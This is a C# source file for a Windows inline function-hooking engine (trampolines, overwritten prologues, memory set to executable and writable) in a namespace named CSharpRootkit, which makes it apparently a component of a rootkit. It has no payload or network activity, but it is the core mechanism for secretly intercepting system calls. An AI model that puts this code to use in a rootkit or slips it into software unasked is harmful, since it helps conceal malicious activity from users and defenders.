using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static CSharpRootkit.InternalStructs;

namespace CSharpRootkit
{
    public class NativeFunctionHooker
    {
        private static uint PAGE_EXECUTE_READWRITE = 0x40;
        private static ulong allocationGranularity = 0;
        private static uint MEM_COMMIT = 0x1000;
        private static uint MEM_RESERVE = 0x2000;
        private static uint MEM_FREE = 0x10000;
        private static uint MEM_RELEASE = 0x8000;


        private static int X64ByteAbsoluteCodeLength = 13;
        private static int X64ByteNewAbsoluteCodeLength = 16;
        private static int X64ByteRelativeCodeLength = 5;
        private static int X86ByteCodeLength = 5;

        private bool usedRelativeX64Hook = false;
        private byte[] RestoreBytes = null;
        private IntPtr TargetFunction;
        private IntPtr HookFunction;
        private IntPtr Trampoline = IntPtr.Zero;

        public NativeFunctionHooker(IntPtr TargetFunction, IntPtr HookFunction)
        {
            this.TargetFunction = TargetFunction;
            this.HookFunction = HookFunction;
        }

        private static int GetSmallestInstructionAmount(IntPtr Function, int target, out string AsmForSection, bool IgnorePossibleBreakers = false)
        {
            int CurrentCount = 0;
            AsmForSection = "";
            while (CurrentCount < target)
            {
                Tuple<int, string> InstructionData = Utils.GetInstructionSizeAndString((ulong)Function);
                int InstructionLength = InstructionData.Item1;
                string asmData = InstructionData.Item2.ToLower();
                if (!IgnorePossibleBreakers && (asmData.Contains("jmp") || asmData.Contains("je") || asmData.Contains("jnz") || asmData.Contains("jl") || asmData.Contains("jne")))
                {
                    throw new Exception("Target length has a good chance of being out of the function!");
                }
                Function += InstructionLength;
                CurrentCount += InstructionLength;
                AsmForSection += asmData;
                AsmForSection += "\n";
            }
            AsmForSection = AsmForSection.Trim('\n');
            return CurrentCount;
        }

        private byte[] GetOptimalJmpByteCodeX64(IntPtr target, string asm)
        {
            if (!asm.Contains("rax") && !asm.Contains("eax"))
            {
                return CreateAbsoluteJumpx64(target, true);
            }
            else if (!asm.Contains("r10"))
            {
                return CreateAbsoluteJumpx64(target, false, true);
            }
            else if (!asm.Contains("r11"))
            {
                return CreateAbsoluteJumpx64(target, false, false, true);
            }
            throw new Exception("Couldnt get optimal bytecode!");
        }

        private IntPtr InstallHookX86()
        {
            int InitalInstructionsLength = GetSmallestInstructionAmount(TargetFunction, X86ByteCodeLength, out string asmCode);
            if (RestoreBytes == null)
            {
                RestoreBytes = new byte[InitalInstructionsLength];
                Marshal.Copy(TargetFunction, RestoreBytes, 0, InitalInstructionsLength);
            }

            Trampoline = Marshal.AllocHGlobal(InitalInstructionsLength + X86ByteCodeLength);

            byte[] jump_back = CreateJumpx86(TargetFunction + InitalInstructionsLength, Trampoline + InitalInstructionsLength);
            byte[] TrampolineBytes = new byte[InitalInstructionsLength + jump_back.Length];
            Marshal.Copy(TargetFunction, TrampolineBytes, 0, InitalInstructionsLength);
            Buffer.BlockCopy(jump_back, 0, TrampolineBytes, InitalInstructionsLength, jump_back.Length);

            Marshal.Copy(TrampolineBytes, 0, Trampoline, TrampolineBytes.Length);

            byte[] JumpBytes = new byte[InitalInstructionsLength];
            for (int i = 0; i < JumpBytes.Length; i++)
            {
                JumpBytes[i] = 0x90; //nop
            }
            byte[] HookBytes = CreateJumpx86(HookFunction, TargetFunction);
            Buffer.BlockCopy(HookBytes, 0, JumpBytes, 0, HookBytes.Length);

            bool Worked = NativeMethods.VirtualProtect(Trampoline, (UIntPtr)TrampolineBytes.Length, PAGE_EXECUTE_READWRITE, out uint _);
            if (!Worked)
            {
                throw new Exception("Couldnt set the Trampoline memory to PAGE_EXECUTE_READ!");
            }

            Worked = NativeMethods.VirtualProtect(TargetFunction, (UIntPtr)JumpBytes.Length, PAGE_EXECUTE_READWRITE, out uint oldProtect);
            if (!Worked)
            {
                throw new Exception("Couldnt set the TargetFunction memory to PAGE_EXECUTE_READWRITE!");
            }

            Marshal.Copy(JumpBytes, 0, TargetFunction, JumpBytes.Length);

            NativeMethods.VirtualProtect(TargetFunction, (UIntPtr)JumpBytes.Length, oldProtect, out _);

            return Trampoline;
        }

        private IntPtr InstallAbsoluteHookX64()
        {
            int InitalInstructionsLength = GetSmallestInstructionAmount(TargetFunction, X64ByteAbsoluteCodeLength, out string asmCode);

            if (RestoreBytes == null)
            {
                RestoreBytes = new byte[InitalInstructionsLength];
                Marshal.Copy(TargetFunction, RestoreBytes, 0, InitalInstructionsLength);
            }

            byte[] jump_back = GetOptimalJmpByteCodeX64(TargetFunction + InitalInstructionsLength, asmCode);
            byte[] TrampolineBytes = new byte[InitalInstructionsLength + jump_back.Length];
            Marshal.Copy(TargetFunction, TrampolineBytes, 0, InitalInstructionsLength);
            Buffer.BlockCopy(jump_back, 0, TrampolineBytes, InitalInstructionsLength, jump_back.Length);

            Trampoline = Marshal.AllocHGlobal(TrampolineBytes.Length);
            Marshal.Copy(TrampolineBytes, 0, Trampoline, TrampolineBytes.Length);
            int InitalInstructionsLength1 = GetSmallestInstructionAmount(Trampoline, TrampolineBytes.Length, out string asmCode1, true);

            byte[] JumpBytes = new byte[InitalInstructionsLength];
            for (int i = 0; i < JumpBytes.Length; i++)
            {
                JumpBytes[i] = 0x90; //nop
            }
            byte[] HookBytes = CreateAbsoluteJumpx64(HookFunction, false, true);
            Buffer.BlockCopy(HookBytes, 0, JumpBytes, 0, HookBytes.Length);

            bool Worked = NativeMethods.VirtualProtect(Trampoline, (UIntPtr)TrampolineBytes.Length, PAGE_EXECUTE_READWRITE, out uint _);
            if (!Worked)
            {
                throw new Exception("Couldnt set the Trampoline memory to PAGE_EXECUTE_READ!");
            }

            Worked = NativeMethods.VirtualProtect(TargetFunction, (UIntPtr)JumpBytes.Length, PAGE_EXECUTE_READWRITE, out uint oldProtect);
            if (!Worked)
            {
                throw new Exception("Couldnt set the TargetFunction memory to PAGE_EXECUTE_READWRITE!");
            }

            Marshal.Copy(JumpBytes, 0, TargetFunction, JumpBytes.Length);

            NativeMethods.VirtualProtect(TargetFunction, (UIntPtr)JumpBytes.Length, oldProtect, out _);

            return Trampoline;

        }

        private IntPtr InstallNewAbsoluteHookX64()
        {
            int InitalInstructionsLength = GetSmallestInstructionAmount(TargetFunction, X64ByteNewAbsoluteCodeLength, out string asmCode);

            if (RestoreBytes == null)
            {
                RestoreBytes = new byte[InitalInstructionsLength];
                Marshal.Copy(TargetFunction, RestoreBytes, 0, InitalInstructionsLength);
            }

            byte[] jump_back = CreateAbsoluteJumpx64New(TargetFunction + InitalInstructionsLength);//GetOptimalJmpByteCodeX64(TargetFunction + InitalInstructionsLength, asmCode);
            byte[] TrampolineBytes = new byte[InitalInstructionsLength + jump_back.Length];
            Marshal.Copy(TargetFunction, TrampolineBytes, 0, InitalInstructionsLength);
            Buffer.BlockCopy(jump_back, 0, TrampolineBytes, InitalInstructionsLength, jump_back.Length);

            Trampoline = Marshal.AllocHGlobal(TrampolineBytes.Length);
            Marshal.Copy(TrampolineBytes, 0, Trampoline, TrampolineBytes.Length);
            int InitalInstructionsLength1 = GetSmallestInstructionAmount(Trampoline, TrampolineBytes.Length, out string asmCode1, true);

            byte[] JumpBytes = new byte[InitalInstructionsLength];
            for (int i = 0; i < JumpBytes.Length; i++)
            {
                JumpBytes[i] = 0x90; //nop
            }
            byte[] HookBytes = CreateAbsoluteJumpx64New(HookFunction);
            Buffer.BlockCopy(HookBytes, 0, JumpBytes, 0, HookBytes.Length);

            bool Worked = NativeMethods.VirtualProtect(Trampoline, (UIntPtr)TrampolineBytes.Length, PAGE_EXECUTE_READWRITE, out uint _);
            if (!Worked)
            {
                throw new Exception("Couldnt set the Trampoline memory to PAGE_EXECUTE_READ!");
            }

            Worked = NativeMethods.VirtualProtect(TargetFunction, (UIntPtr)JumpBytes.Length, PAGE_EXECUTE_READWRITE, out uint oldProtect);
            if (!Worked)
            {
                throw new Exception("Couldnt set the TargetFunction memory to PAGE_EXECUTE_READWRITE!");
            }

            Marshal.Copy(JumpBytes, 0, TargetFunction, JumpBytes.Length);

            NativeMethods.VirtualProtect(TargetFunction, (UIntPtr)JumpBytes.Length, oldProtect, out _);

            return Trampoline;

        }

        private IntPtr InstallRelativeHookX64()
        {
            int InitalInstructionsLength = GetSmallestInstructionAmount(TargetFunction, X64ByteAbsoluteCodeLength, out string asmCode);
            if (RestoreBytes == null)
            {
                RestoreBytes = new byte[InitalInstructionsLength];
                Marshal.Copy(TargetFunction, RestoreBytes, 0, InitalInstructionsLength);
            }

            Trampoline = SpecialAllocate2GBRange(TargetFunction + InitalInstructionsLength, (uint)(InitalInstructionsLength + X64ByteRelativeCodeLength));//Marshal.AllocHGlobal(InitalInstructionsLength + X64ByteRelativeCodeLength);

            byte[] jump_back = CreateRelativeJumpx64(TargetFunction + InitalInstructionsLength, Trampoline + InitalInstructionsLength);
            byte[] TrampolineBytes = new byte[InitalInstructionsLength + jump_back.Length];
            Marshal.Copy(TargetFunction, TrampolineBytes, 0, InitalInstructionsLength);
            Buffer.BlockCopy(jump_back, 0, TrampolineBytes, InitalInstructionsLength, jump_back.Length);

            Marshal.Copy(TrampolineBytes, 0, Trampoline, TrampolineBytes.Length);

            byte[] JumpBytes = new byte[InitalInstructionsLength];
            for (int i = 0; i < JumpBytes.Length; i++)
            {
                JumpBytes[i] = 0x90; //nop
            }
            byte[] HookBytes = CreateAbsoluteJumpx64(HookFunction);
            Buffer.BlockCopy(HookBytes, 0, JumpBytes, 0, HookBytes.Length);

            bool Worked = NativeMethods.VirtualProtect(Trampoline, (UIntPtr)TrampolineBytes.Length, PAGE_EXECUTE_READWRITE, out uint _);
            if (!Worked)
            {
                throw new Exception("Couldnt set the Trampoline memory to PAGE_EXECUTE_READ!");
            }

            Worked = NativeMethods.VirtualProtect(TargetFunction, (UIntPtr)JumpBytes.Length, PAGE_EXECUTE_READWRITE, out uint oldProtect);
            if (!Worked)
            {
                throw new Exception("Couldnt set the TargetFunction memory to PAGE_EXECUTE_READWRITE!");
            }

            Marshal.Copy(JumpBytes, 0, TargetFunction, JumpBytes.Length);

            NativeMethods.VirtualProtect(TargetFunction, (UIntPtr)JumpBytes.Length, oldProtect, out _);

            usedRelativeX64Hook = true;
            return Trampoline;
        }

        public T InstallHook<T>()
        {
            if (Environment.Is64BitProcess)
            {
                return Marshal.GetDelegateForFunctionPointer<T>(InstallNewAbsoluteHookX64());
            }
            else
            {
                return Marshal.GetDelegateForFunctionPointer<T>(InstallHookX86());
            }
        }

        public void RemoveHook()
        {
            if (RestoreBytes == null) 
            {
                throw new Exception("RestoreBytes is null, did you install the hook?");
            }

            bool Worked = NativeMethods.VirtualProtect(TargetFunction, (UIntPtr)RestoreBytes.Length, PAGE_EXECUTE_READWRITE, out uint oldProtect);

            if (!Worked)
            {
                throw new Exception("Couldnt set the TargetFunction memory to PAGE_EXECUTE_READWRITE!");
            }

            Marshal.Copy(RestoreBytes, 0, TargetFunction, RestoreBytes.Length);

            NativeMethods.VirtualProtect(TargetFunction, (UIntPtr)RestoreBytes.Length, oldProtect, out _);
            if (usedRelativeX64Hook)
            {
                FreeSpeciallyAllocatedData(Trampoline);
                usedRelativeX64Hook = false;
            }
            else
            {
                Marshal.FreeHGlobal(Trampoline);
            }
            Trampoline = IntPtr.Zero;
            RestoreBytes = null;
        }

        private byte[] CreateAbsoluteJumpx64New(IntPtr target)
        {
            byte[] jmpBytes = new byte[X64ByteNewAbsoluteCodeLength];

            jmpBytes[0] = 0x50; // push rax
            jmpBytes[1] = 0x48; // REX.W prefix
            jmpBytes[2] = 0xB8; // mov rax, target
            BitConverter.GetBytes(target.ToInt64()).CopyTo(jmpBytes, 3);
            jmpBytes[11] = 0x48; // REX.W prefix
            jmpBytes[12] = 0x87; // xchg
            jmpBytes[13] = 0x04; // ModR/M byte
            jmpBytes[14] = 0x24; // SIB byte
            jmpBytes[15] = 0xC3; // ret

            return jmpBytes;
        }
        private byte[] CreateAbsoluteJumpx64(IntPtr target, bool UseRax = true, bool UseR10 = false, bool UseR11 = false)
        {
            int trueCount = 0;
            if (UseRax) trueCount += 1;
            if (UseR10) trueCount += 1;
            if (UseR11) trueCount += 1;
            if (trueCount != 1)
            {
                throw new Exception("you can only use 1 register!");
            }
            byte[] jmpBytes = new byte[X64ByteAbsoluteCodeLength];



            if (UseR10)
            {
                jmpBytes[0] = 0x49; // REX prefix for R10
                jmpBytes[1] = 0xBA; // MOV R10, target
                //addr
                jmpBytes[10] = 0x41; // REX prefix for R10
                jmpBytes[11] = 0xFF; // JMP R10
                jmpBytes[12] = 0xE2;
            }
            else if (UseR11)
            {
                jmpBytes[0] = 0x49; // REX prefix for R11
                jmpBytes[1] = 0xBB; // MOV R11, target
                //addr
                jmpBytes[10] = 0x41; // REX prefix for R11
                jmpBytes[11] = 0xFF; // JMP R11
                jmpBytes[12] = 0xE3;
            }
            else
            {
                jmpBytes[0] = 0x48; // REX.W prefix for 64-bit operand size
                jmpBytes[1] = 0xB8; // MOV RAX, target
                //addr
                jmpBytes[10] = 0xFF; // JMP RAX
                jmpBytes[11] = 0xE0;
                jmpBytes[12] = 0x90; // nop
            }

            BitConverter.GetBytes(target.ToInt64()).CopyTo(jmpBytes, 2);


            return jmpBytes;
        }
        private byte[] CreateRelativeJumpx64(IntPtr target, IntPtr source)
        {
            long Tempoffset = target.ToInt64() - source.ToInt64() - X64ByteRelativeCodeLength;
            if (Math.Abs(Tempoffset) >= 0x80000000)
            {
                throw new Exception("Distance between the 2 functions are too large, must be below 2^31");
            }
            int offset = (int)Tempoffset;
            byte[] jmpBytes = new byte[X64ByteRelativeCodeLength];
            jmpBytes[0] = 0xE9; // JMP opcode
            BitConverter.GetBytes(offset).CopyTo(jmpBytes, 1);
            return jmpBytes;
        }
        private byte[] CreateJumpx86(IntPtr target, IntPtr source)
        {
            int offset = target.ToInt32() - source.ToInt32() - X86ByteCodeLength;
            byte[] jmpBytes = new byte[X86ByteCodeLength];
            jmpBytes[0] = 0xE9; // JMP opcode
            BitConverter.GetBytes(offset).CopyTo(jmpBytes, 1);
            return jmpBytes;
        }
        private static IntPtr SpecialAllocate2GBRange(IntPtr address, uint dwSize)
        {
            if (allocationGranularity == 0)
            {
                SYSTEM_INFO si;
                NativeMethods.GetSystemInfo(out si);
                allocationGranularity = si.allocationGranularity;
            }

            ulong add = allocationGranularity - 1;
            ulong mask = ~add;
            //0x80000000 = 2^31
            ulong min = 0;
            ulong max = ulong.MaxValue;
            if ((ulong)address >= 0x80000000)
            {
                min = ((ulong)address - 0x80000000 + add) & mask;
            }
            if ((ulong)address < (ulong.MaxValue - 0x80000000))
            {
                max = ((ulong)address + 0x80000000) & mask;
            }

            do
            {
                if (NativeMethods.VirtualQuery((IntPtr)min, out MEMORY_BASIC_INFORMATION mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) == 0)
                    return IntPtr.Zero;

                min = (ulong)mbi.BaseAddress + (ulong)mbi.RegionSize;

                if (mbi.State == MEM_FREE)
                {
                    ulong addr = ((ulong)mbi.BaseAddress + add) & mask;

                    if (addr < min && dwSize <= (min - addr))
                    {
                        IntPtr allocatedAddr = NativeMethods.VirtualAlloc((IntPtr)addr, (UIntPtr)dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                        if (allocatedAddr != IntPtr.Zero)
                            return allocatedAddr;
                    }
                }
            } while (min < max);

            return IntPtr.Zero;
        }
        private static bool FreeSpeciallyAllocatedData(IntPtr address)
        {
            return NativeMethods.VirtualFree(address, UIntPtr.Zero, MEM_RELEASE);
        }
    }
}